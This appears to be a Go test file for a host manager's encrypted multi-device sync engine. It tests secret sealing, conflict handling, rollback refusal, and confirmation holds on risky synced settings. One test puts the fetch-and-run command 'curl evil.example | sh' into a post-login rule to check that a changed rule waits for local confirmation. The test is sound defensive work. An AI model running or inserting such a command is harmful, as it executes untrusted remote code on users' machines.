package sync

import (
	"bytes"
	"context"
	"errors"
	"os"
	"path/filepath"
	"reflect"
	"strconv"
	gosync "sync"
	"testing"
	"time"

	"github.com/zalando/go-keyring"

	"hostbay/internal/secrets"
	"hostbay/internal/store"
)

// device is one computer: its own store, its own master key, one target.
type device struct {
	dir   string
	st    *store.Store
	vault *secrets.Vault
	eng   *Engine
}

// newDevice opens a store in a fresh keychain, so every device has its own
// master key, as two computers would.
func newDevice(t *testing.T, b Backend) *device {
	t.Helper()
	dir := filepath.Join(t.TempDir(), "Hostbay")
	st, err := store.Open(dir)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	keyring.MockInit()
	v := secrets.New(st, nil)
	if err := v.SetMasterPassword("test master password"); err != nil { // Linux needs one before sealing
		t.Fatal(err)
	}
	if _, err := v.Seal([]byte("x"), nil); err != nil { // loads this device's key now
		t.Fatal(err)
	}
	k, key := derived(t)
	return &device{dir: dir, st: st, vault: v, eng: &Engine{Store: st, Vault: v, Backend: b, Key: key, KDF: k, KeyID: "k1", State: &State{}}}
}

func (d *device) sync(t *testing.T) Report {
	t.Helper()
	r, err := d.eng.Sync(context.Background(), "")
	if err != nil {
		t.Fatalf("sync: %v", err)
	}
	return r
}

func (d *device) addHost(t *testing.T, alias, password string) string {
	t.Helper()
	var id string
	err := d.st.Edit(func(data *store.Data) error {
		h := store.Host{Meta: store.Meta{ID: store.NewID()}, Alias: alias, Hostname: alias + ".example", Port: 22, User: "root"}
		if password != "" {
			sealed, err := d.vault.Seal([]byte(password), h.SecretAAD())
			if err != nil {
				return err
			}
			h.Password = sealed
		}
		id = data.PutHost(h).ID
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return id
}

func (d *device) edit(t *testing.T, fn func(*store.Data) error) {
	t.Helper()
	if err := d.st.Edit(fn); err != nil {
		t.Fatal(err)
	}
}

func (d *device) data(t *testing.T) *store.Data {
	t.Helper()
	data, err := d.st.Data()
	if err != nil {
		t.Fatal(err)
	}
	return data
}

func (d *device) host(t *testing.T, id string) *store.Host {
	t.Helper()
	return d.data(t).Host(id)
}

func (d *device) password(t *testing.T, id string) (string, error) {
	t.Helper()
	h := d.host(t, id)
	if h == nil || h.Password == "" {
		return "", errors.New("no password")
	}
	pw, err := d.vault.Open(h.Password, h.SecretAAD())
	return string(pw), err
}

func aliases(t *testing.T, d *device) map[string]string {
	t.Helper()
	out := map[string]string{}
	for _, h := range d.data(t).Hosts.Items {
		out[h.ID] = h.Alias
	}
	return out
}

// memBackend is a shared compare-and-swap target, like Git, WebDAV or S3.
type memBackend struct {
	mu          gosync.Mutex
	data        []byte
	ver         int
	beforeStore func() // runs once, before the next Store compares versions
}

func (m *memBackend) Fetch(context.Context) ([]File, string, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.data == nil {
		return nil, "", nil
	}
	return []File{{Name: SharedName, Data: bytes.Clone(m.data)}}, strconv.Itoa(m.ver), nil
}

func (m *memBackend) Store(_ context.Context, name string, data []byte, version string) error {
	if f := m.beforeStore; f != nil {
		m.beforeStore = nil
		f()
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	cur := ""
	if m.data != nil {
		cur = strconv.Itoa(m.ver)
	}
	if version != cur {
		return ErrConflict
	}
	m.data, m.ver = bytes.Clone(data), m.ver+1
	return nil
}

func (m *memBackend) Version(context.Context) (string, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	return strconv.Itoa(m.ver), nil
}

func (m *memBackend) Prune(context.Context) error { return nil }
func (m *memBackend) PerDevice() bool             { return false }
func (m *memBackend) Close() error                { return nil }

func TestPasswordSavedOnOneComputerConnectsFromAnother(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	id := a.addHost(t, "web", "s3cret")
	a.sync(t)
	b.sync(t)
	if pw, err := b.password(t, id); pw != "s3cret" || err != nil {
		t.Fatalf("B's password = %q, %v", pw, err)
	}
	if bytes.Contains(remote.data, []byte("s3cret")) || bytes.Contains(remote.data, []byte("web.example")) {
		t.Fatal("the target holds readable data")
	}
}

func TestWipedKeychainDoesNotEraseTheOtherComputersSecret(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	id := a.addHost(t, "web", "s3cret")
	a.sync(t)
	b.sync(t)

	// A's keychain item is gone: a new master key, and A's sealed password no
	// longer opens.
	keyring.MockInit()
	a.vault = secrets.New(a.st, nil)
	a.eng.Vault = a.vault
	if _, err := a.password(t, id); err == nil {
		t.Fatal("A's password still opens after the keychain was wiped")
	}
	a.sync(t)
	b.sync(t)
	if pw, err := b.password(t, id); pw != "s3cret" || err != nil {
		t.Fatalf("B's password = %q, %v after A synced without it", pw, err)
	}
	a.sync(t)
	if pw, err := a.password(t, id); pw != "s3cret" || err != nil {
		t.Fatalf("A did not get its password back: %q, %v", pw, err)
	}
}

func TestHostnameEditWithoutNewPasswordLeavesTheOtherComputerAsking(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	id := a.addHost(t, "web", "s3cret")
	a.sync(t)
	b.sync(t)
	a.edit(t, func(d *store.Data) error {
		return d.EditHost(id, func(h *store.Host) { h.Hostname = "elsewhere.example" })
	})
	a.sync(t)
	b.sync(t)
	if h := b.host(t, id); h.Hostname != "elsewhere.example" {
		t.Fatalf("hostname = %q", h.Hostname)
	}
	if pw, err := b.password(t, id); err == nil {
		t.Fatalf("B opened %q for a host pointed elsewhere", pw)
	}
}

func TestConcurrentEditsKeepNewerAndListOlder(t *testing.T) { // AE14
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	id := a.addHost(t, "web", "")
	a.sync(t)
	b.sync(t)
	a.edit(t, func(d *store.Data) error { return d.EditHost(id, func(h *store.Host) { h.Alias = "name-from-a" }) })
	time.Sleep(10 * time.Millisecond)
	b.edit(t, func(d *store.Data) error { return d.EditHost(id, func(h *store.Host) { h.Alias = "name-from-b" }) })
	a.sync(t)
	b.sync(t)
	a.sync(t)
	if aliases(t, a)[id] != "name-from-b" || aliases(t, b)[id] != "name-from-b" {
		t.Fatalf("A has %q, B has %q; want name-from-b on both", aliases(t, a)[id], aliases(t, b)[id])
	}
	cs := b.eng.State.Conflicts
	if len(cs) != 1 || cs[0].Label != "name-from-a" {
		t.Fatalf("B's conflicts = %+v, want the name-from-a version", cs)
	}

	// Restoring the listed version makes it the newest change.
	if err := b.eng.RestoreConflict(cs[0].ID); err != nil {
		t.Fatal(err)
	}
	b.sync(t)
	a.sync(t)
	if aliases(t, a)[id] != "name-from-a" || len(b.eng.State.Conflicts) != 0 {
		t.Fatalf("after restore A has %q", aliases(t, a)[id])
	}
}

func TestConcurrentUploadRetriesAndKeepsBothChanges(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	a.sync(t)
	b.sync(t)
	ida := a.addHost(t, "from-a", "")
	idb := b.addHost(t, "from-b", "")
	// A uploads after B fetched but before B's upload lands.
	remote.beforeStore = func() { a.sync(t) }
	r := b.sync(t)
	if r.Retries == 0 {
		t.Fatal("B's upload did not have to retry")
	}
	a.sync(t)
	for _, d := range []*device{a, b} {
		got := aliases(t, d)
		if got[ida] != "from-a" || got[idb] != "from-b" {
			t.Fatalf("got %v, want both hosts", got)
		}
	}
}

func TestWrongPassphrasePausesAndChangesNothing(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	a.addHost(t, "web", "")
	a.sync(t)
	b.addHost(t, "local-only", "")
	wrong, err := b.eng.KDF.Derive("this is the wrong passphrase")
	if err != nil {
		t.Fatal(err)
	}
	b.eng.Key = wrong
	before, ver := bytes.Clone(remote.data), remote.ver
	beforeLocal := aliases(t, b)
	_, err = b.eng.Sync(context.Background(), "merge")
	if !errors.Is(err, ErrDecrypt) || b.eng.State.Paused != CodeDecrypt {
		t.Fatalf("sync = %v, paused %q; want ErrDecrypt and a pause", err, b.eng.State.Paused)
	}
	if !bytes.Equal(before, remote.data) || ver != remote.ver {
		t.Fatal("the remote changed")
	}
	if got := aliases(t, b); len(got) != len(beforeLocal) {
		t.Fatalf("local data changed: %v", got)
	}
}

func TestNewerFormatUploadsNothingAndAsksForUpdate(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	a.sync(t)
	m := Manifest{KeyID: "k1", KDF: a.eng.KDF, DeviceID: "future", Generation: 1, MinReaderVersion: ReaderVersion + 1}
	blob, err := Seal(m, []byte(`{}`), a.eng.Key)
	if err != nil {
		t.Fatal(err)
	}
	remote.data = blob
	ver := remote.ver
	b.addHost(t, "pending", "")
	if _, err := b.eng.Sync(context.Background(), ""); !errors.Is(err, ErrUpdateNeeded) || b.eng.State.Paused != CodeUpdateNeeded {
		t.Fatalf("sync = %v, want ErrUpdateNeeded", err)
	}
	if remote.ver != ver || !bytes.Equal(remote.data, blob) {
		t.Fatal("an older client uploaded over a newer snapshot")
	}
}

func TestReplayedOlderSnapshotIsRefused(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	a.addHost(t, "one", "")
	a.sync(t)
	old := bytes.Clone(remote.data)
	a.addHost(t, "two", "")
	a.sync(t)
	b.sync(t)
	remote.data, remote.ver = old, remote.ver+1
	if _, err := b.eng.Sync(context.Background(), ""); !errors.Is(err, ErrRollback) {
		t.Fatalf("sync = %v, want ErrRollback", err)
	}
}

func TestSyncedTunnelBeyondLoopbackWaitsForLocalConfirmation(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	hid := a.addHost(t, "web", "")
	var tid string
	a.edit(t, func(d *store.Data) error {
		tid = d.PutTunnel(store.Tunnel{HostID: hid, Name: "db", Kind: "local", BindHost: "0.0.0.0", BindPort: 5432, AllowExternal: true}).ID
		return nil
	})
	a.sync(t)
	b.sync(t)
	b.sync(t) // a second pass must not apply it either
	if b.data(t).Tunnel(tid).AllowExternal {
		t.Fatal("a synced tunnel listens beyond loopback before local confirmation")
	}
	if len(b.eng.State.Holds) != 1 {
		t.Fatalf("holds = %+v", b.eng.State.Holds)
	}
	a.sync(t)
	if !a.data(t).Tunnel(tid).AllowExternal {
		t.Fatal("B's hold changed the setting on A")
	}
	if err := b.eng.ResolveHold(tid, true); err != nil {
		t.Fatal(err)
	}
	if !b.data(t).Tunnel(tid).AllowExternal || len(b.eng.State.Holds) != 0 {
		t.Fatal("confirming did not apply the tunnel setting")
	}
}

// A synced change to plain FTP or an http:// URL waits for confirmation
// on each computer, which meanwhile keeps the encrypted setting, so its
// password is never sent in the clear on another computer's say-so (KTD22).
func TestSyncedPlaintextFileHostWaitsForLocalConfirmation(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	ftp, none, dav := "ftp", "none", "webdav"
	url := "http://dav.example/files"
	var fid, did string
	a.edit(t, func(d *store.Data) error {
		fid = d.PutHost(store.Host{Alias: "files", Hostname: "ftp.example", Port: 21, User: "u", Kind: &ftp, TLS: &none}).ID
		did = d.PutHost(store.Host{Alias: "dav", User: "u", Kind: &dav, URL: &url}).ID
		return nil
	})
	sealPassword := func(d *device, id, pw string) {
		d.edit(t, func(data *store.Data) error {
			h := data.Host(id)
			sealed, err := d.vault.Seal([]byte(pw), h.SecretAAD())
			h.Password = sealed
			data.PutHost(*h)
			return err
		})
	}
	sealPassword(a, fid, "ftp-pw")
	a.sync(t)
	b.sync(t)
	b.sync(t) // a second pass must not apply it either
	if h := b.host(t, fid); h.Plaintext() || b.host(t, did).Plaintext() {
		t.Fatal("a synced plaintext setting applied before local confirmation")
	}
	if _, err := b.password(t, fid); err == nil {
		t.Fatal("the password opens for the stand-in setting")
	}
	if len(b.eng.State.Holds) != 2 || b.eng.State.Holds[0].Kind != "host" {
		t.Fatalf("holds = %+v", b.eng.State.Holds)
	}
	a.sync(t)
	if !a.host(t, fid).Plaintext() || !a.host(t, did).Plaintext() {
		t.Fatal("B's hold changed the setting on A")
	}

	if err := b.eng.ResolveHold(fid, true); err != nil {
		t.Fatal(err)
	}
	if h := b.host(t, fid); !h.Plaintext() || len(b.eng.State.Holds) != 1 {
		t.Fatal("confirming did not apply the plaintext setting")
	}
	if pw, err := b.password(t, fid); err != nil || pw != "ftp-pw" {
		t.Fatalf("after confirming, password = %q, %v", pw, err)
	}

	// Refusing keeps the encrypted URL and sends it to the other computers.
	if err := b.eng.ResolveHold(did, false); err != nil {
		t.Fatal(err)
	}
	b.sync(t)
	a.sync(t)
	if h := a.host(t, did); h.Plaintext() || *h.URL != "https://dav.example/files" {
		t.Fatalf("refusal did not reach A: %+v", h)
	}
}

func TestKeyStoreKeyResolvesOnAnotherComputer(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	keyFile := []byte("-----BEGIN OPENSSH PRIVATE KEY-----\nfake\n")
	a.edit(t, func(d *store.Data) error {
		id := store.NewID()
		sealed, err := a.vault.Seal(keyFile, store.KeyAAD(id))
		if err != nil {
			return err
		}
		if _, err := d.AddKey(store.Key{Meta: store.Meta{ID: id}, Name: "id_work", Data: sealed}); err != nil {
			return err
		}
		d.PutHost(store.Host{Alias: "web", Hostname: "web.example", Port: 22, User: "root", IdentityFile: store.KeyRefPrefix + "id_work"})
		return nil
	})
	a.sync(t)
	b.sync(t)
	d := b.data(t)
	k := d.KeyByName("id_work")
	if k == nil {
		t.Fatal("key did not sync")
	}
	got, err := b.vault.Open(k.Data, store.KeyAAD(k.ID))
	if err != nil || !bytes.Equal(got, keyFile) {
		t.Fatalf("B's key = %q, %v", got, err)
	}
	if bytes.Contains(remote.data, []byte("PRIVATE KEY")) {
		t.Fatal("key file readable on the target")
	}
}

func TestCrossingFolderMovesEndWithoutACycle(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	var x, y string
	a.edit(t, func(d *store.Data) error {
		x, y = d.AddFolder(store.Folder{Name: "X"}).ID, d.AddFolder(store.Folder{Name: "Y"}).ID
		return nil
	})
	a.sync(t)
	b.sync(t)
	a.edit(t, func(d *store.Data) error {
		_, err := d.SaveFolder(store.Folder{Meta: d.Folder(x).Meta, Name: "X", ParentID: &y})
		return err
	})
	b.edit(t, func(d *store.Data) error {
		_, err := d.SaveFolder(store.Folder{Meta: d.Folder(y).Meta, Name: "Y", ParentID: &x})
		return err
	})
	a.sync(t)
	b.sync(t)
	a.sync(t)
	for _, d := range []*device{a, b} {
		data := d.data(t)
		if data.Folder(x).ParentID != nil && data.Folder(y).ParentID != nil {
			t.Fatal("folders form a cycle")
		}
	}
}

func TestFirstSyncAsksThenMergesWithoutDuplicates(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	// Both computers imported the same host on their own.
	a.addHost(t, "shared", "")
	a.addHost(t, "only-a", "")
	a.sync(t)
	b.addHost(t, "shared", "")
	b.addHost(t, "only-b", "")
	if _, err := b.eng.Sync(context.Background(), ""); !errors.Is(err, ErrChoiceNeeded) {
		t.Fatalf("first sync = %v, want ErrChoiceNeeded", err)
	}
	if _, err := b.eng.Sync(context.Background(), "merge"); err != nil {
		t.Fatal(err)
	}
	a.sync(t)
	for _, d := range []*device{a, b} {
		count := map[string]int{}
		for _, alias := range aliases(t, d) {
			count[alias]++
		}
		if count["shared"] != 1 || count["only-a"] != 1 || count["only-b"] != 1 || len(count) != 3 {
			t.Fatalf("hosts = %v", count)
		}
	}
}

func TestPurgedHostStaysGoneAfterBothSync(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	id := a.addHost(t, "web", "")
	a.sync(t)
	b.sync(t)
	a.edit(t, func(d *store.Data) error { return d.PurgeHost(id) })
	a.sync(t)
	b.sync(t)
	a.sync(t)
	if a.host(t, id) != nil || b.host(t, id) != nil {
		t.Fatal("purged host came back")
	}
}

func TestSyncWritesNoReadableSecretToTheStore(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	a.addHost(t, "web", "s3cret-pw")
	a.sync(t)
	b.sync(t)
	for _, d := range []*device{a, b} {
		filepath.Walk(d.dir, func(p string, info os.FileInfo, err error) error {
			if err == nil && !info.IsDir() {
				if raw, _ := os.ReadFile(p); bytes.Contains(raw, []byte("s3cret-pw")) || bytes.Contains(raw, []byte(testPassphrase)) {
					t.Errorf("%s holds a secret in readable form", p)
				}
			}
			return nil
		})
	}
}

func TestPassphraseChangeReencryptsAndAsksOtherComputers(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	id := a.addHost(t, "web", "pw")
	a.sync(t)
	b.sync(t)

	kdf, err := NewKDF()
	if err != nil {
		t.Fatal(err)
	}
	newKey, err := kdf.Derive("a brand new passphrase 42")
	if err != nil {
		t.Fatal(err)
	}
	a.eng.PrevKey, a.eng.PrevKeyID = a.eng.Key, a.eng.KeyID
	a.eng.Key, a.eng.KDF, a.eng.KeyID = newKey, kdf, "k2"
	a.sync(t)
	if m, _ := ReadManifest(remote.data); m.KeyID != "k2" {
		t.Fatalf("snapshot key ID %q after the change", m.KeyID)
	}
	if _, err := b.eng.Sync(context.Background(), ""); !errors.Is(err, ErrPassphraseChanged) || b.eng.State.Paused != CodePassphraseChange {
		t.Fatalf("B's sync = %v, want ErrPassphraseChanged", err)
	}
	m, _ := ReadManifest(remote.data)
	if b.eng.Key, err = m.KDF.Derive("a brand new passphrase 42"); err != nil {
		t.Fatal(err)
	}
	b.eng.KDF, b.eng.KeyID = m.KDF, m.KeyID
	b.sync(t)
	if pw, err := b.password(t, id); pw != "pw" || err != nil {
		t.Fatalf("B's password after re-keying = %q, %v", pw, err)
	}
}

func TestDueSeesLocalAndRemoteChanges(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	a.sync(t)
	b.sync(t)
	ctx := context.Background()
	if due, err := b.eng.Due(ctx); due || err != nil {
		t.Fatalf("Due right after a sync = %v, %v", due, err)
	}
	b.addHost(t, "local", "")
	if due, _ := b.eng.Due(ctx); !due {
		t.Fatal("a local change is not due")
	}
	b.sync(t)
	a.addHost(t, "remote", "")
	a.sync(t)
	if due, _ := b.eng.Due(ctx); !due {
		t.Fatal("a remote change is not due")
	}
}

// A hold of a kind this build does not know stays held and listed: it is
// not taken for a tunnel, and resolving it neither applies nor drops it.
func TestUnknownHoldKindStaysHeld(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	hid := a.addHost(t, "web", "")
	var tid string
	a.edit(t, func(d *store.Data) error {
		tid = d.PutTunnel(store.Tunnel{HostID: hid, Name: "db", Kind: "local", BindPort: 5432}).ID
		return nil
	})
	a.sync(t)
	b.sync(t)
	// A newer Hostbay's hold that happens to share the tunnel's ID and Meta.
	future := Hold{ID: tid, Kind: "future", Name: "rule", Meta: b.data(t).Tunnel(tid).Meta}
	b.eng.State.Holds = []Hold{future}
	b.sync(t)
	a.sync(t)
	if len(b.eng.State.Holds) != 1 || !reflect.DeepEqual(b.eng.State.Holds[0], future) {
		t.Fatalf("holds = %+v, want the unknown hold kept as it was", b.eng.State.Holds)
	}
	if a.data(t).Tunnel(tid).AllowExternal || b.data(t).Tunnel(tid).AllowExternal {
		t.Fatal("an unknown hold was applied as a tunnel")
	}
	if err := b.eng.ResolveHold(tid, true); err == nil {
		t.Fatal("resolving an unknown hold succeeded")
	}
	if len(b.eng.State.Holds) != 1 || b.data(t).Tunnel(tid).AllowExternal {
		t.Fatalf("after resolving: holds %+v", b.eng.State.Holds)
	}
}

// addRule saves a post-login rule for hostID whose custom secret is answer.
func (d *device) addRule(t *testing.T, hostID, answer string) string {
	t.Helper()
	var id string
	d.edit(t, func(data *store.Data) error {
		r := store.PostLoginRule{Meta: store.Meta{ID: store.NewID()}, HostID: hostID, Steps: []store.PostLoginStep{{Expect: "Password:", Kind: store.ReplySecret}}}
		sealed, err := d.vault.Seal([]byte(answer), store.PostLoginAAD(r.ID, data.Host(hostID)))
		if err != nil {
			return err
		}
		r.Answer = sealed
		id = data.PutPostLogin(r).ID
		return nil
	})
	return id
}

func (d *device) answer(t *testing.T, ruleID string) (string, error) {
	t.Helper()
	data := d.data(t)
	r := data.PostLoginRule(ruleID)
	if r == nil || r.Answer == "" {
		return "", errors.New("no answer")
	}
	pw, err := d.vault.Open(r.Answer, store.PostLoginAAD(r.ID, data.Host(r.HostID)))
	return string(pw), err
}

// A rule and its host made on A arrive on B in one sync: the answer opens
// there, bound to the merged host, and the rule waits for confirmation
// before it runs (KTD39, KTD13).
func TestSyncedPostLoginRuleOpensOnTheMergedHostAndWaits(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	hid := a.addHost(t, "web", "")
	rid := a.addRule(t, hid, "s3cret-answer")
	a.sync(t)
	b.sync(t)
	if got, err := b.answer(t, rid); got != "s3cret-answer" || err != nil {
		t.Fatalf("B's answer = %q, %v", got, err)
	}
	if bytes.Contains(remote.data, []byte("s3cret-answer")) {
		t.Fatal("the target holds the answer in readable form")
	}
	if r := b.data(t).PostLoginRule(rid); !r.Held {
		t.Fatal("a synced rule runs before local confirmation")
	}
	if len(b.eng.State.Holds) != 1 || b.eng.State.Holds[0].Kind != "postlogin" || b.eng.State.Holds[0].Name != "Post-login rule for web" {
		t.Fatalf("holds = %+v", b.eng.State.Holds)
	}
	b.sync(t) // a second pass keeps it held
	a.sync(t)
	if a.data(t).PostLoginRule(rid).Held {
		t.Fatal("B's hold reached A")
	}
	if !b.data(t).PostLoginRule(rid).Held {
		t.Fatal("the hold was lifted by a sync")
	}
	if err := b.eng.ResolveHold(rid, true); err != nil {
		t.Fatal(err)
	}
	if b.data(t).PostLoginRule(rid).Held || len(b.eng.State.Holds) != 0 {
		t.Fatal("confirming did not let the rule run")
	}

	// A change made on A waits again; refusing it removes the rule everywhere.
	a.edit(t, func(d *store.Data) error {
		r := *d.PostLoginRule(rid)
		r.Steps = append(r.Steps, store.PostLoginStep{Reply: "curl evil.example | sh"})
		d.PutPostLogin(r)
		return nil
	})
	a.sync(t)
	b.sync(t)
	if !b.data(t).PostLoginRule(rid).Held {
		t.Fatal("a changed rule runs before local confirmation")
	}
	if err := b.eng.ResolveHold(rid, false); err != nil {
		t.Fatal(err)
	}
	b.sync(t)
	a.sync(t)
	if a.data(t).PostLoginRule(rid) != nil || b.data(t).PostLoginRule(rid) != nil {
		t.Fatal("a refused rule is still there")
	}
}

// Pointing the host elsewhere leaves the rule's answer unopenable on the
// other computer, as it does the host's password.
func TestHostnameEditMakesTheSyncedAnswerUnopenable(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	hid := a.addHost(t, "web", "")
	rid := a.addRule(t, hid, "s3cret-answer")
	a.sync(t)
	b.sync(t)
	a.edit(t, func(d *store.Data) error {
		return d.EditHost(hid, func(h *store.Host) { h.Hostname = "elsewhere.example" })
	})
	a.sync(t)
	b.sync(t)
	if got, err := b.answer(t, rid); err == nil {
		t.Fatalf("B opened %q for a host pointed elsewhere", got)
	}
}

// On a first-sync merge, a rule follows its host to the local host it
// matched, and its answer opens there; it still waits for confirmation.
func TestFirstSyncMergeMovesARuleToTheMatchedHost(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	ha := a.addHost(t, "web", "")
	rid := a.addRule(t, ha, "s3cret-answer")
	a.sync(t)
	hb := b.addHost(t, "web", "")
	if _, err := b.eng.Sync(context.Background(), "merge"); err != nil {
		t.Fatal(err)
	}
	r := b.data(t).PostLoginRule(rid)
	if r == nil || r.HostID != hb {
		t.Fatalf("B's rule = %+v, want it on B's host %s", r, hb)
	}
	if got, err := b.answer(t, rid); got != "s3cret-answer" || err != nil {
		t.Fatalf("B's answer = %q, %v", got, err)
	}
	if !r.Held {
		t.Fatal("a merged rule runs before local confirmation")
	}
}

// A workspace's panes name hosts; on a first merge they must follow A's
// host to the B host it matched, or they point at an ID the merge purged.
// That holds for a workspace new to B and for one B already holds under the
// same ID, and A gets the remapped layout on its next sync.
func TestFirstSyncMergeMovesWorkspacePanesToTheMatchedHost(t *testing.T) {
	remote := &memBackend{}
	a, b := newDevice(t, remote), newDevice(t, remote)
	ha := a.addHost(t, "web", "")
	hb := b.addHost(t, "web", "")
	pane := func(host string) store.WorkspaceNode { return store.WorkspaceNode{HostID: host} }
	shared := store.NewID()
	b.edit(t, func(d *store.Data) error {
		d.PutWorkspace(store.Workspace{Meta: store.Meta{ID: shared}, Name: "shared", Layout: pane(hb)})
		return nil
	})
	var fresh string
	a.edit(t, func(d *store.Data) error {
		fresh = d.PutWorkspace(store.Workspace{Meta: store.Meta{ID: store.NewID()}, Name: "fresh", Layout: pane(ha)}).ID
		d.PutWorkspace(store.Workspace{Meta: store.Meta{ID: shared}, Name: "shared", Layout: pane(ha)}) // newer than B's
		return nil
	})
	a.sync(t)
	if _, err := b.eng.Sync(context.Background(), "merge"); err != nil {
		t.Fatal(err)
	}
	for _, id := range []string{fresh, shared} {
		if w := b.data(t).Workspace(id); w == nil || w.Layout.HostID != hb {
			t.Fatalf("B's workspace %s = %+v, want its pane on B's host %s", id, w, hb)
		}
	}
	a.sync(t)
	for _, id := range []string{fresh, shared} {
		if w := a.data(t).Workspace(id); w == nil || w.Layout.HostID != hb {
			t.Fatalf("A's workspace %s = %+v, want its pane on the merged host %s", id, w, hb)
		}
	}
}
